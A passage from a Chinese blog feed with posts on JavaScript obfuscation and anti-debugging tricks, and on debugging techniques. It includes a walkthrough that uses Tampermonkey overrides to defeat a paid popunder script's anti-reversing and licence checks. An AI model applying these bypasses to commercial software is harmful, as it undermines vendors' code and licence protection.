<li><a href="http://www.owasp.org/index.php/OWASP_Testing_Project" target="_blank" rel="external">http://www.owasp.org/index.php/OWASP_Testing_Project</a></li>
<li><a href="http://www.red-database-security.com/" target="_blank" rel="external">http://www.red-database-security.com</a></li>
<li><a href="http://www.petefinnigan.com/" target="_blank" rel="external">http://www.petefinnigan.com</a></li>
<li><a href="http://www.insomniasec.com/releases/whitepapers-presentations" target="_blank" rel="external">http://www.insomniasec.com/releases/whitepapers-presentations</a></li>
<li><a href="http://www.isecom.org/osstmm/" target="_blank" rel="external">http://www.isecom.org/osstmm/</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[JavaScript反混淆与混淆]]></title>
      <url>/2017/11/14/JavaScript%E5%8F%8D%E6%B7%B7%E6%B7%86%E4%B8%8E%E6%B7%B7%E6%B7%86/</url>
      <content type="html"><![CDATA[<p>本文摘抄于岚光的博客<a href="https://0x0d.im/archives/javascript-anti-debug-and-obfuscator.html" target="_blank" rel="external">https://0x0d.im/archives/javascript-anti-debug-and-obfuscator.html</a></p>
<p>前些时候因为人机识别和反作弊业务的需求调研了<a href="https://0x0d.im/archives/broswer-fingerprint-and-tracking.html" target="_blank" rel="external">浏览器指纹和追踪</a>的一些方法，那么当我们把检测代码上线后，怎么保护它，不被攻击者迅速分析破解呢？</p>
<p>常见的编码（如 <a href="http://dean.edwards.name/packer/" target="_blank" rel="external">Base62</a>）、压缩（如 <a href="https://github.com/mishoo/UglifyJS2" target="_blank" rel="external">UglifyJS</a>）、复杂化表达式（如填充无用代码，拆分字符串）就不细说了。<br>至于将 JavaScript 代码隐藏在图片中类似隐写术的方法，一般是恶意程序为了逃避杀毒软件检测所用，正常业务很少用到。</p>
<p>通常用各种编码“加密”的代码，无论怎样变形，其最终都要调用一次 <code>eval</code> 等函数执行。<br>只需劫持关键函数调用的行为，改为文本输出（如 <code>console.log</code>）即可得到载体中隐藏的代码。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'eval'</span>, <span class="built_in">JSON</span>.stringify(<span class="built_in">arguments</span>));</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">eval</span>(<span class="string">'console.log("Hello world!")'</span>);</div></pre></td></tr></table></figure>
<p>去除空格、换行，缩短函数、变量名之类的压缩代码可以直接用浏览器的开发者工具格式化，或是使用 <a href="http://jsbeautifier.org/" target="_blank" rel="external">jsbeautifier</a> 等在线工具美化。<br>复杂化表达式会增加代码复杂度，极大地降低可读性，但有经验和耐心的研究者依然能慢慢调试还原出功能来。</p>
<p>(下面代码在 Chrome 59 上测试通过）</p>
<h4 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h4><p>检测到浏览器 Console 打开（<a href="http://stackoverflow.com/questions/40153206/detect-all-browser-console-open-or-not" target="_blank" rel="external">Detect all browser console open or not</a>）时阻塞 Javascript 执行：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> checkStatus;</div><div class="line"><span class="keyword">var</span> element = <span class="keyword">new</span> Image();</div><div class="line"><span class="comment">// var element = document.createElement('any');</span></div><div class="line">element.__defineGetter__(<span class="string">'id'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    checkStatus = <span class="string">'on'</span>;</div><div class="line">&#125;);</div><div class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    checkStatus = <span class="string">'off'</span>;</div><div class="line">    <span class="built_in">console</span>.log(element);</div><div class="line">    <span class="built_in">console</span>.clear();</div><div class="line">    <span class="keyword">if</span>(checkStatus = <span class="string">'on'</span>) &#123;</div><div class="line">        alert(<span class="string">'Prohibit the use of console!'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;, <span class="number">1000</span>)</div></pre></td></tr></table></figure>
<h4 id="Debugger"><a href="#Debugger" class="headerlink" title="Debugger"></a>Debugger</h4><p>Console 调试时会自动停在断点处，借此可以插入随机的 debugger 干扰正常调试。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">!<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 捕获异常，递归次数过多调试工具会抛出异常。</span></div><div class="line">    <span class="keyword">try</span>&#123;</div><div class="line">        !<span class="function"><span class="keyword">function</span> <span class="title">cir</span>(<span class="params">i</span>)</span></div><div class="line">        &#123;</div><div class="line">            <span class="comment">// 当打开调试工具后，抛出异常，setTimeout执行test无参数，此时i == NaN，("" + i / i).length == 3</span></div><div class="line">            <span class="comment">// debugger设置断点</span></div><div class="line">            ( <span class="number">1</span> !== ( <span class="string">""</span> + i / i).length || <span class="number">0</span>===i ) &amp;&amp; <span class="function"><span class="keyword">function</span>(<span class="params">&#123;&#125;.constructor(<span class="string">"debugger"</span></span>)(<span class="params"></span>),<span class="title">cir</span>(<span class="params">++i</span>);</span></div><div class="line">        &#125; (<span class="params"><span class="number">0</span></span>)</div><div class="line">    &#125; <span class="title">catch</span>(<span class="params">e</span>) &#123;</div><div class="line">        setTimeout(test,<span class="number">500</span>)</div><div class="line">    &#125;</div><div class="line">&#125;()</div></pre></td></tr></table></figure>
<p><strong>demo：</strong><a href="https://jsfiddle.net/ftpgxm/t4ux8xp4/2/" target="_blank" rel="external">https://jsfiddle.net/ftpgxm/t4ux8xp4/2/</a></p>
<p>当然，为了能够调试，我们可以使用Tampermonkey，在执行js代码之前，先执行下列代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">window._setTimeout = window.setTimeout;</div><div class="line">window.setTimeout = function () &#123;&#125;;</div></pre></td></tr></table></figure>
<p>具体可参考：</p>
<ul>
<li><a href="http://www.jianshu.com/p/9148d215c119" target="_blank" rel="external">http://www.jianshu.com/p/9148d215c119</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/29214928" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/29214928</a></li>
</ul>
<h4 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h4><p>通过修改 <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree" target="_blank" rel="external">AST(Abstract Syntax Tree)</a> 生成一个新的 AST，混淆规则有拆分字符串、拆分数组，增加废代码等。<br>如在同构语法的基础上提取出所有 key 值到闭包的参数中，破坏代码的可读性：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'a'</span>);</div><div class="line">a.innerHTML = <span class="string">'test'</span>;</div></pre></td></tr></table></figure>
<p>混淆之后是：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a,b,c,d,e,f</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> g=a[b][c](d);</div><div class="line">    g[e]=f</div><div class="line">&#125;)(<span class="built_in">window</span>,<span class="string">'document'</span>, <span class="string">'getElementById'</span>, <span class="string">'a'</span>, <span class="string">'innerHTML'</span>, <span class="string">'test'</span>);</div></pre></td></tr></table></figure>
<h4 id="WebAssembly"><a href="#WebAssembly" class="headerlink" title="WebAssembly"></a>WebAssembly</h4><p><a href="https://en.wikipedia.org/wiki/WebAssembly" target="_blank" rel="external">WebAssembly</a> 是可用于浏览器的字节码格式，比 JS 更高效，能从 <code>C/C++</code> 编译。<br>如一个简单的 <code>add</code> 和 <code>square</code>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">WebAssembly.compile(<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="string">`</span></div><div class="line">  00 61 73 6d  01 00 00 00  01 0c 02 60  02 7f 7f 01</div><div class="line">  7f 60 01 7f  01 7f 03 03  02 00 01 07  10 02 03 61</div><div class="line">  64 64 00 00  06 73 71 75  61 72 65 00  01 0a 13 02</div><div class="line">  08 00 20 00  20 01 6a 0f  0b 08 00 20  00 20 00 6c</div><div class="line">  0f 0b`.trim().split(<span class="regexp">/[\s\r\n]+/g</span>).map(<span class="function"><span class="params">str</span> =&gt;</span> <span class="built_in">parseInt</span>(str, <span class="number">16</span>))</div><div class="line">)).then(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</div><div class="line">  <span class="keyword">const</span> instance = <span class="keyword">new</span> WebAssembly.Instance(<span class="built_in">module</span>)</div><div class="line">  <span class="keyword">const</span> &#123; add, square &#125; = instance.exports</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'2 + 4 ='</span>, add(<span class="number">2</span>, <span class="number">4</span>))</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'3^2 ='</span>, square(<span class="number">3</span>))</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'(2 + 5)^2 ='</span>, square(add(<span class="number">2</span> + <span class="number">5</span>)))</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<p>它可能是终极的解决办法，因为作为二进制编码它自带“混淆”，还可以进一步加壳或虚拟机保护。</p>
<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>对于大部分的 JS 代码混淆加密，其实都可以用 <a href="https://en.wikipedia.org/wiki/Partial_evaluation" target="_blank" rel="external">Partial evaluation</a> 解决（参见讨论：<a href="https://www.v2ex.com/t/367641" target="_blank" rel="external">https://www.v2ex.com/t/367641</a>）。<br>如 Google 的 <a href="https://closure-compiler.appspot.com/" target="_blank" rel="external">Closure Compiler</a> 和 FaceBook 的 <a href="https://prepack.io/" target="_blank" rel="external">Prepack</a>，虽然是用于 JS 代码优化的工具，<br>但它们都会在编译期重构 AST、计算函数、初始化对象等，最终还原出正常的可读的代码。</p>
<p>对于干扰 Console 调试的方法，可以用 Fiddler 或 Burp Suite 抓包，拦截页面请求，删除或注释掉干扰代码。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<ul>
<li><a href="http://blog.knownsec.com/2015/08/use-estools-aid-deobfuscate-javascript/" target="_blank" rel="external">使用 estools 辅助反混淆</a></li>
<li><a href="http://div.io/topic/1220" target="_blank" rel="external">Javascript 移动时代的前端加密</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.foiOcx&amp;articleid=503" target="_blank" rel="external">可信前端之路-代码保护</a></li>
<li><a href="http://infosec.bjtu.edu.cn/wangwei/wp-content/uploads/2016/10/%E6%B7%B7%E6%B7%86%E6%81%B6%E6%84%8FJavaScript%E4%BB%A3%E7%A0%81%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%8D%E6%B7%B7%E6%B7%86%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E6%8A%A5.pdf" target="_blank" rel="external">混淆恶意JavaScript代码的检测与反混淆方法研究</a></li>
<li><a href="https://www.zhihu.com/question/29266193" target="_blank" rel="external">怎样理解 Partial Evaluation</a></li>
<li><a href="https://segmentfault.com/a/1190000008402872" target="_blank" rel="external">WebAssembly 实践：如何写代码</a></li>
</ul>
</blockquote>
]]></content>
      
        <categories>
            
            <category> misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[javascript的调试]]></title>
      <url>/2017/11/13/javascript%E7%9A%84%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<p>javascript作为一种普适性的脚本语言，广泛应用于网页端、移动端。而本文将要讲述的是javascript的调试。</p>
<h3 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h3><h4 id="javascript内置命令调试"><a href="#javascript内置命令调试" class="headerlink" title="javascript内置命令调试"></a>javascript内置命令调试</h4><p>javascript作为一种脚本语言，内置了大量的输出函数。这里主要讲述的是alert/prompt/confirm、console.log、document.write。</p>
<p>其实上面的&quot;、&quot;已经为我们分好类的。</p>
<ol>
<li>弹框式输出</li>
<li>console命令框输出</li>
<li>网页内输出</li>
</ol>
<p><strong>弹框式输出</strong></p>
<p>优点：可以作为IO中断</p>
<p>缺点：由于是中断操作，频繁的确定会比较麻烦。弹框中所能容纳的字符数有限</p>
<p><strong>console命令框输出</strong></p>
<p>优点：输出内容无限制</p>
<p>缺点：不能产生中断，较长的代码调试起来相对而言较麻烦</p>
<p><strong>网页内输出</strong></p>
<p>优点：由于是在网页内部输出，所以内容样式可以自定义。输出内容也没有限制</p>
<p>缺点：不能产生中断，较长的代码调试起来相对而言较麻烦</p>
<p><strong>辅助工具</strong></p>
<p>由于输出的内容多样化，很多时候我们需要的字符串类型，这时候不妨使用toString函数，以此来方便查看输出结果！</p>
<h4 id="Visual-Studio-Code"><a href="#Visual-Studio-Code" class="headerlink" title="Visual Studio Code"></a>Visual Studio Code</h4><p>vsc是最近我所使用的文本编辑器，以前一直使用sublime作为文本编辑的工具。visual studio code是一款轻量级的IDE，可进行多种脚本语言的调试与编写！而且vsc支持windows、mac、linux，是一款不可多得的调试软件。具体操作步骤就不再赘述，因为与vs基本一致！</p>
<p>优点：支持多种脚本语言的编译调试</p>
<p>缺点：由于visual studio code使用nodejs作为底层调试器，所以不支持弹框式输出以及I网页内输出等方式。这也就意味着，很多在浏览器中能够实现的编写方式在这里很有可能编译不通</p>
<h4 id="Chrome开发者模式-推荐"><a href="#Chrome开发者模式-推荐" class="headerlink" title="Chrome开发者模式(推荐)"></a>Chrome开发者模式<font color="#f00">(推荐)</font></h4><p>chrome的开发者模式中，sources选项栏中支持了调试。其右上角给出了调试工具、断点信息、监听器信息等等，总而言之功能十分强大。</p>
<p>优点：chrome开发者模式进行调试，能够解决大部分js静态分析问题，功能齐全，支持几乎全部的js命令</p>
<p>缺点：现如今有许多网页在做开发的时候，进行了反调试功能。这个时候，chrome的开发者模式进行调试可能效果不明显。但是我们可以配合<font color="#f00"><a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?utm_source=chrome-ntp-icon" target="_blank" rel="external">Tampermonkey</a></font> 进行脚本设置，封闭/变相禁用反调试功能。</p>
<p>范例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">window</span>._setTimeout = <span class="built_in">window</span>.setTimeout;</div><div class="line">    <span class="built_in">window</span>.setTimeout = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
<p>由于在执行网页中的js代码之前，先调用了上述代码。所以setTimeout函数都给更改了，这就导致了反调试的重要一环被截断，这会在后面的章节进行讲述。</p>
<h3 id="综合范例"><a href="#综合范例" class="headerlink" title="综合范例"></a>综合范例</h3><p>可以说这儿的范例是从网上摘抄的，所以大家擦亮的自己的眼睛，防止被误导。</p>
<h4 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h4><p>最近在研究 PopUnder 的实现方案，通过 Google 搜索 <code>js popunder</code> 出来的第一页中有个网站 <code>popunderjs.com</code>，当时看了下，这是个提供 popunder 解决方案的一家公司，而且再翻了几页，发现市面上能解决这个问题的，只有2家公司，可见这个市场基本是属于垄断型的。<br>popunderjs 原来在 github 上是有开源代码的，但后来估计作者发现这个需求巨大的商业价值，索性不开源了，直接收费。所以现在要研究它的实现方案，只能上官网扒它源码了。</p>
<p>这是它的示例页：<code>http://code.ptcong.com/demos/bjp/demo.html</code><br>分别加载了几个重要文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://code.ptcong.com/demos/bjp/script.js?0.3687041198903791</div><div class="line">http://code.ptcong.com/demos/bjp/license.demo.js?0.31109710863616447</div></pre></td></tr></table></figure>
<h4 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h4><p>script.js 是功能主体，实现了 popunder 的所有功能以及定义了多个 API 方法<br>license.demo.js 是授权文件，有这个文件你才能顺利调用 script.js 里的方法</p>
<h4 id="防止被逆向"><a href="#防止被逆向" class="headerlink" title="防止被逆向"></a>防止被逆向</h4><p>这么具有商业价值的代码，就这么公开地给你们用，肯定要考虑好被逆向的问题。我们来看看它是怎么反逆向的。<br>首先，打开控制台，发现2个问题：</p>
<ol>
<li>控制台所有内容都被反复清空，只输出了这么一句话：<code>Console was cleared script.js?0.5309098417125133:1</code></li>
<li>无法断点调试，因为一旦启用断点调试功能，就会被定向到一个匿名函数 <code>(function() {debugger})</code></li>
</ol>
<p>也就是说，常用的断点调试方法已经无法使用了，我们只能看看源代码，看能不能理解它的逻辑了。但是，它源代码是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="keyword">typeof</span> <span class="built_in">window</span> === S[<span class="number">0</span>] &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">window</span>[S[<span class="number">1</span>]] !== S[<span class="number">2</span>] ? <span class="built_in">window</span> : global;</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    a[S[<span class="number">3</span>]](S[<span class="number">4</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">    ;</div><div class="line">&#125; <span class="keyword">catch</span> (a) &#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">        [S[<span class="number">11</span>]](S[<span class="number">12</span>])());</div><div class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">        ;</div><div class="line">    &#125; <span class="keyword">catch</span> (a) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="regexp">/TypeError/</span>[S[<span class="number">15</span>]](a + S[<span class="number">16</span>])) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">            ;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可见源代码是根本不可能阅读的，所以还是得想办法破掉它的反逆向措施。</p>
<h4 id="利用工具巧妙破解反逆向"><a href="#利用工具巧妙破解反逆向" class="headerlink" title="利用工具巧妙破解反逆向"></a>利用工具巧妙破解反逆向</h4><p>首先在断点调试模式一步步查看它都执行了哪些操作，突然就发现了这么一段代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    (<span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            (<span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params">i</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> ((<span class="string">''</span> + (i / i)).length !== <span class="number">1</span> || i % <span class="number">20</span> === <span class="number">0</span>) &#123;</div><div class="line">                    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">                    ).constructor(<span class="string">'debugger'</span>)();</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="keyword">debugger</span> ;</div><div class="line">                &#125;</div><div class="line">                b(++i);</div><div class="line">            &#125;</div><div class="line">            )(<span class="number">0</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">            setTimeout(a, <span class="number">5000</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    )()</div><div class="line">&#125;</div><div class="line">)();</div></pre></td></tr></table></figure>
<p>这段代码主要有2部分，一是通过 try {} 块内的 b() 函数来判断是否打开了控制台，如果是的话就进行自我调用，反复进入 debugger 这个断点，从而达到干扰我们调试的目的。如果没有打开控制台，那调用 debugger 就会抛出异常，这时就在 catch {} 块内设置定时器，5秒后再调用一下 b() 函数。</p>
<p>这么说来其实一切的一切都始于 setTimeout 这个函数（因为 b() 函数全是闭包调用，无法从外界破掉），所以只要在 setTimeout 被调用的时候，不让它执行就可以破解掉这个死循环了。</p>
<p>所以我们只需要简单地覆盖掉 setTimeout 就可以了……比如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">window</span>._setTimeout = <span class="built_in">window</span>.setTimeout;</div><div class="line">    <span class="built_in">window</span>.setTimeout = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
<p>但是！这个操作无法在控制台里面做！因为当你打开控制台的时候，你就必然会被吸入到 b() 函数的死循环中。这时再来覆盖 setTimeout 已经没有意义了。</p>
<p>这时我们的工具 TamperMonkey 就上场了，把代码写到 TM 的脚本里，就算不打开控制台也能执行了。</p>
<font color="#f00">TM 脚本写好之后，刷新页面，等它完全加载完，再打开控制台，这时 debugger 已经不会再出现了！<strong>接下来就轮到控制台刷新代码了</strong></font>

<p>通过 <code>Console was cleared</code> 右侧的链接点进去定位到具体的代码，点击 <code>{}</code> 美化一下被压缩过的代码，发现其实就是用 setInterval 反复调用 console.clear() 清空控制台并输出了 <code>&lt;div&gt;Console was cleared&lt;/div&gt;</code> 信息，但是注意了，不能直接覆盖 setInterval 因为这个函数在其他地方也有重要的用途。</p>
<p>所以我们可以通过覆盖 console.clear() 函数和过滤 log 信息来阻止它的清屏行为。</p>
<p>同样写入到 TamperMonkey 的脚本中，代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">window.console.clear = function() &#123;&#125;;</div><div class="line">window.console._log = window.console.log;</div><div class="line">window.console.log = function (e) &#123;</div><div class="line">    if (e[&apos;nodeName&apos;] &amp;&amp; e[&apos;nodeName&apos;] == &apos;DIV&apos;) &#123;</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line">    return window.console.error.apply(window.console._log, arguments);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>之所以用 error 来输出信息，是为了查看它的调用栈，对理解程序逻辑有帮助。</p>
<hr>
<p>基本上，做完这些的工作之后，这段代码就可以跟普通程序一样正常调试了。但还有个问题，它主要代码是经常混淆加密的，所以调试起来很有难度。下面简单讲讲过程。</p>
<h4 id="混淆加密方法一：隐藏方法调用，降低可读性"><a href="#混淆加密方法一：隐藏方法调用，降低可读性" class="headerlink" title="混淆加密方法一：隐藏方法调用，降低可读性"></a>混淆加密方法一：隐藏方法调用，降低可读性</h4><p>从 license.demo.js 可以看到开头有一段代码是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> zBCa = <span class="function"><span class="keyword">function</span> <span class="title">T</span>(<span class="params">f</span>) </span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> U = <span class="number">0</span>, V = <span class="number">0</span>, W, X, Y = (X = <span class="built_in">decodeURI</span>(<span class="string">"+TR4W%17%7F@%17.....省略若干"</span>),</div><div class="line">    W = <span class="string">''</span>,</div><div class="line">    <span class="string">'D68Q4cYfvoqAveD2D8Kb0jTsQCf2uvgs'</span>); U &lt; X.length; U++,</div><div class="line">    V++) &#123;</div><div class="line">        <span class="keyword">if</span> (V === Y.length) &#123;</div><div class="line">            V = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        W += <span class="built_in">String</span>[<span class="string">"fromCharCode"</span>](X[<span class="string">"charCodeAt"</span>](U) ^ Y[<span class="string">"charCodeAt"</span>](V));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> S = W.split(<span class="string">"&amp;&amp;"</span>);</div></pre></td></tr></table></figure>
<p>通过跟踪执行，可以发现 S 变量的内容其实是本程序所有要用到的类名、函数名的集合，类似于 <code>var S = [&#39;console&#39;, &#39;clear&#39;, &#39;console&#39;, &#39;log&#39;]</code>。如果要调用 console.clear() 和 console.log() 函数的话，就这样</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="built_in">window</span>;</div><div class="line">a[S[<span class="number">0</span>]][S[<span class="number">1</span>]]();</div><div class="line">a[S[<span class="number">2</span>]][S[<span class="number">3</span>]]();</div></pre></td></tr></table></figure>
<h4 id="混淆加密方法二：将函数定义加入到证书验证流程"><a href="#混淆加密方法二：将函数定义加入到证书验证流程" class="headerlink" title="混淆加密方法二：将函数定义加入到证书验证流程"></a>混淆加密方法二：将函数定义加入到证书验证流程</h4><p>license.demo.js 中有多处这样的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a[&apos;RegExp&apos;](&apos;/R[\S]&#123;4&#125;p.c\wn[\D]&#123;5&#125;t\wr/&apos;,&apos;g&apos;)[&apos;test&apos;](T + &apos;&apos;)</div></pre></td></tr></table></figure>
<p>这里的 a 代表 window，T 代表某个函数，<code>T + &#39;&#39;</code> 的作用是把 T 函数的定义转成字符串，所以这段代码的意思其实是，验证 T 函数的定义中是否包含某些字符。</p>
<p>每次成功的验证，都会返回一个特定的值，这些个特定的值就是解密核心证书的参数。</p>
<p>可能是因为我重新整理了代码格式，所以在重新运行的时候，这个证书一直运行不成功，所以后来就放弃了通过证书来突破的方案。</p>
<h4 id="逆向思路：输出所有函数调用和参数"><a href="#逆向思路：输出所有函数调用和参数" class="headerlink" title="逆向思路：输出所有函数调用和参数"></a>逆向思路：输出所有函数调用和参数</h4><p>通过断点调试，我们可以发现，想一步一步深入地搞清楚这整个程序的逻辑，是十分困难，因为它大部分函数之间都是相互调用的关系，只是参数的不同，结果就不同。</p>
<p>所以我后来想了个办法，就是只查看它的系统函数的调用，通过对调用顺序的研究，也可以大致知道它执行了哪些操作。</p>
<p>要想输出所有系统函数的调用，需要解决以下问题：</p>
<ol>
<li>覆盖所有内置变量及类的函数，我们既要覆盖 <code>window.console.clear()</code> 这样的依附在实例上的函数，也要覆盖依附在类定义上的函数，如 <code>window.HTMLAnchorElement.__proto__.click()</code></li>
<li>需要正确区分内置函数和自定义函数</li>
</ol>
<p>经过搜索后，找到了区分内置函数的代码：</p>
